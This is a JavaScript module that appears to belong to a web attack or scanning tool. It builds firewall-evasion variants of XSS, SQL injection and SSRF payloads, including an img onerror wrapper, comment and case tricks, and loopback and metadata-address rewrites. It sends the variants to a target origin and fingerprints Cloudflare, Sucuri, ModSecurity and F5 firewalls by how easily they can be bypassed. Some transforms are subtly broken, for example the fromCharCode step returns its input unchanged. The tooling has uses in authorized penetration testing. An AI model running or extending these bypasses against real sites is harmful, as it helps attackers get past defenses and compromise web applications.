const encodingBypasses = {
  xss: [
    (p) => encodeURIComponent(p),
    (p) => `\x3C${p.slice(1)}`,
    (p) => `${p}`,
    (p) => `<${p.slice(1).toUpperCase()}`,
    (p) => `${p} /**/`,
    (p) => p.replace(/script/g, 'ScRiPt').replace(/alert/g, 'aLerT'),
    (p) => String.fromCharCode(...p.split('').map(c => c.charCodeAt(0))),
    (p) => `<img/src=x onerror=${p.match(/alert\([^)]+\)/)?.[0] || p}>`,
  ],
  sqli: [
    (p) => encodeURIComponent(p),
    (p) => p,
    (p) => p.replace(/ /g, '/**/'),
    (p) => p.replace(/ /g, '+'),
    (p) => p.replace(/'/g, '%27'),
    (p) => p.replace(/=/g, '%3D'),
    (p) => p.replace(/SELECT/g, 'SeLeCt').replace(/UNION/g, 'UnIoN'),
    (p) => p.replace(/OR/g, '||').replace(/'/g, '"'),
  ],
  ssrf: [
    (p) => p,
    (p) => p.replace(/\./g, '%2E'),
    (p) => p.replace(/http:\/\//g, 'http://127.0.0.1/'),
    (p) => p.replace(/169\.254/g, '169[.]254'),
  ],
};

export function getBypassPayloads(type, payload, wafType) {
  const bypasses = encodingBypasses[type] || [(p) => p];
  return bypasses.map(fn => ({ payload: fn(payload), encoding: fn === bypasses[0] ? 'plain' : 'encoded' }));
}

export async function testWithBypass(origin, module, payload, doRequest) {
  const bypasses = getBypassPayloads(module, payload);
  const results = [];

  for (const { payload: bp, encoding } of bypasses.slice(0, 6)) {
    try {
      const resp = await doRequest(origin, bp);
      results.push({ encoding, payload: bp, status: resp.status, success: resp.status === 200 });
    } catch {
      results.push({ encoding, payload: bp, status: 0, success: false });
    }
  }

  return results;
}

export function detectWaf(headers, body) {
  const wafs = [];

  if (headers['cf-ray']) wafs.push({ name: 'Cloudflare', bypassLevel: 'high' });
  if (headers['x-sucuri-id']) wafs.push({ name: 'Sucuri', bypassLevel: 'medium' });
  if (body?.includes('ModSecurity')) wafs.push({ name: 'ModSecurity', bypassLevel: 'medium' });
  if (headers['server']?.includes('BigIP') || headers['x-cnection']) wafs.push({ name: 'F5 BIG-IP', bypassLevel: 'medium' });
  if (/403|Forbidden|Blocked|Access Denied|WAF|Web Application Firewall/i.test(body || '')) {
    if (!wafs.length) wafs.push({ name: 'Generic WAF', bypassLevel: 'low' });
  }

  return wafs;
}
